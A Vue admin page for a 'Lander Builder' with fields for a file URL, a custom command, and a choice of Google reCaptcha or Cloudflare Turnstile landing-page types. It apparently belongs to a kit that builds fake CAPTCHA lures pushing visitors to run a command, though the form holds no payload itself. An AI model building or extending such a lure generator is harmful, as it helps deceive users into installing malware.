<template>
    <Head title="Lander Builder" />

    <AdminLayout>
        <h1 class="text-2xl font-bold mb-6">
            <GoBack :href="`/admin/tools`"></GoBack> Lander Builder
        </h1>

        <!-- Success Message -->
        <div v-if="flash.success" class="mb-4 p-4 bg-green-100 text-green-700 rounded">
            {{ flash.success }}
        </div>

        <!-- Error Message -->
        <div v-if="flash.error" class="mb-4 p-4 bg-red-100 text-red-700 rounded">
            {{ flash.error }}
        </div>

        <form @submit.prevent="submit">
            <div class="mb-4">
                <label for="file_url" class="block text-gray-700">File URL</label>
                <input
                    v-model="form.file_url"
                    type="text"
                    id="file_url"
                    class="mt-1 block w-full border-gray-300 rounded-md"
                />
                <span v-if="form.errors.file_url" class="text-red-600 text-sm">
                    {{ form.errors.file_url }}
                </span>
            </div>

            <div class="mb-4">
                <label for="custom_command" class="block text-gray-700">Custom Command</label>
                <textarea
                    v-model="form.custom_command"
                    id="custom_command"
                    class="mt-1 block w-full border-gray-300 rounded-md"></textarea>
                <span v-if="form.errors.custom_command" class="text-red-600 text-sm">
                    {{ form.errors.custom_command }}
                </span>
            </div>

            <div class="mb-4">
                <label for="lander_type" class="block text-gray-700">Lander Type</label>
                <select id="lander_type" class="mt-1 block w-full border-gray-300 rounded-md" v-model="form.lander_type">
                    <option value="">Select a type</option>
                    <option value="recaptcha">Google reCaptcha</option>
                    <option value="turnstile">Cloudflare Turnstile</option>
                </select>
                <span v-if="form.errors.lander_type" class="text-red-600 text-sm">
                    {{ form.errors.lander_type }}
                </span>
            </div>

            <button type="submit" class="px-4 py-2 bg-blue-600 text-white rounded-md hover:bg-blue-700">Build</button>
        </form>
    </AdminLayout>
</template>

<script setup>
import GoBack from '@/components/GoBack.vue';
import AdminLayout from '@/Layouts/AdminLayout.vue';
import { ref } from 'vue';
import { Head, Link, useForm, usePage } from '@inertiajs/vue3';

const { props } = usePage();

const form = useForm({
    file_url: props.file_url || '',
    custom_command: props.custom_command || '',
    lander_type: props.lander_type || 'recaptcha'
});

const flash = props.flash || {};
</script>
